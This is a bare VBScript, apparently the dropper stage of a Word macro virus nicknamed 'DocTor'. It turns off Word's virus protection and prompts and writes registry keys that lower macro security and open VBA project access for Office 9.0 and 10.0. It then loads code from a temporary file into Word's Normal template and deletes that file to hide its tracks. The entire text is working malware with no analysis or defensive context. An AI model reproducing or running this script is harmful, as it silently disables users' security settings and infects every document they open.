On Error Resume Next
set fso=createobject("scripting.filesystemobject")
set ws=createobject("wscript.shell")
Set wrd=createObject("Word.Application")
wrd.options.virusprotection=0
wrd.options.savenormalprompt=0
wrd.options.confirmconversions=0
ws.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level",1,"REG_DWORD"
ws.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level",1,"REG_DWORD"
ws.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM",1,"REG_DWORD"
If wrd.normaltemplate.vbproject.vbcomponents(1).name <> "DocTor" then
wrd.normaltemplate.vbproject.vbcomponents(1).codemodule.addfromfile("C:\nqkgyesx.txt")
wrd.normaltemplate.vbproject.vbcomponents(1).name="DocTor"
End If
wscript.sleep 500
fso.deletefile "C:\nqkgyesx.txt"
wrd.application.quit
